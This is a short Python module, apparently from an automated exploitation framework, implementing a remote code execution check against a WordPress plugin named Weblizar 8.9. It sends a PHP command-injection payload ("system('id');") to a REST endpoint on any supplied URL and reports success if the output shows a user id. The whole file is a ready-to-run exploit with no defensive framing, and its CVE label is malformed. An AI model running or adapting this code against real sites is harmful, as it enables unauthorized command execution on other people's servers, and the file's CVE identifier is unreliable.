import requests
from ...exploit import Exploit, CMS, Categorys
from ....config import Config
from ....handler.retry.retryrequest import RetryRequest

retry_request = RetryRequest(max_retries=3)
CONFIG = Config()

class Weblizar(Exploit):
    name = "WordPress Plugin Weblizar 8.9"
    cms = CMS.Wordpress
    category = Categorys.RCE
    cve = "CVE-2021-08-24"

    def run(self, url):

        check = retry_request.retry(requests.get, f"{url}/wp-json/am-member/license", timeout=CONFIG.timeouts(), headers={'User-Agent': CONFIG.useragent()})
        if check.status_code == 200:
            payload = {"blowfish": 1, "blowf": "system('id');"}
            check = retry_request.retry(requests.get, f"{url}/wp-json/am-member/license", timeout=CONFIG.timeouts(), headers={'User-Agent': CONFIG.useragent()}, params=payload)
            if "uid" in check.text:
                return True

        return False